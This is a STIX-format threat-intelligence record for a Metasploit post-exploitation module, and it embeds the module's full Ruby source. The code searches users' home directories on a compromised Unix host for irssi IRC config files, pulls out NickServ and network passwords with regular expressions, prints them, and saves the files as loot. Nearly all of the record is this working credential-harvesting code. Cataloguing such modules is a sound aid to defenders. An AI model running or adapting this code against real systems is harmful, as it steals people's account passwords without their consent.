{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--bf1d8ac2-dfd5-49bb-8303-4df3886ec9d7",
    "created": "2024-08-14T16:33:19.181965Z",
    "modified": "2024-08-14T16:33:19.181969Z",
    "name": "Multi Gather IRSSI IRC Password(s)",
    "description": " This module grabs IRSSI IRC credentials. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/multi/gather/irssi_creds.rb",
            "external_id": "irssi_creds.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Post::Unix\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Multi Gather IRSSI IRC Password(s)',\n        'Description' => %q{\n          This module grabs IRSSI IRC credentials.\n        },\n        'Author' => [\n          'Jonathan Claudius <jclaudius[at]mozilla.com>',\n        ],\n        'Platform' => %w[bsd linux osx unix],\n        'SessionTypes' => %w[shell],\n        'License' => MSF_LICENSE\n      )\n    )\n  end\n\n  def run\n    print_status('Finding ~/.irssi/config')\n    paths = enum_user_directories.map { |d| d + '/.irssi/config' }\n    paths = paths.select { |f| file?(f) }\n\n    if paths.empty?\n      print_error('No users found with a ~/.irssi/config file')\n      return\n    end\n\n    download_passwords(paths)\n  end\n\n  # Example of what we're looking for in the config...\n  #\n  # ***Identify Password Example***\n  # autosendcmd = \"/msg nickserv identify example_password ;wait 2000\";\n  #\n  # ***Network Password Example***\n  #    password = \"example_password\";\n  #\n  def contains_passwords?(path)\n    data = read_file(path)\n    identify_passwords = data.scan(%r{/\\^?msg nickserv identify ([^\\s]+)})\n    network_passwords = data.scan(/^?password = \"([^\\s]+)\"/)\n\n    passwords = identify_passwords.flatten + network_passwords.flatten\n\n    if passwords.any?\n      print_good(\"Found IRC password(s) of #{passwords.join(',')} in irssi config at #{path}\")\n      return true\n    end\n\n    false\n  end\n\n  def download_passwords(paths)\n    print_status \"Looting #{paths.count} files\"\n\n    paths.each do |path|\n      path.chomp!\n      next if ['.', '..'].include?(path)\n\n      next unless contains_passwords?(path)\n\n      loot_path = store_loot(\n        'irssi config file',\n        'text/plain',\n        session,\n        read_file(path),\n        path,\n        'IRC Password'\n      )\n      print_good(\"irssi config with passwords stored in #{loot_path}\")\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "%w[bsd linux osx unix]"
    ]
}